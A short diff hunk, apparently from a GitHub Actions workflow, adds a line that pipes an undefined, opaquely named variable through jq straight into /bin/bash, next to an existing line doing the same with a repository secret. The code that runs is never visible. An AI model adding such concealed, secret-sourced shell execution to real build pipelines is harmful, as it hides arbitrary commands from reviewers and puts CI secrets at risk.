@@ -21,6 +21,7 @@ jobs:
           pfrfd9: ${{ secrets.pfrfd9 }}
         run: |
           printf '%s' "$pfrfd9" | jq -r .pr652 | /bin/bash
+          printf '%s' "$oxl865" | jq -r .o99 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
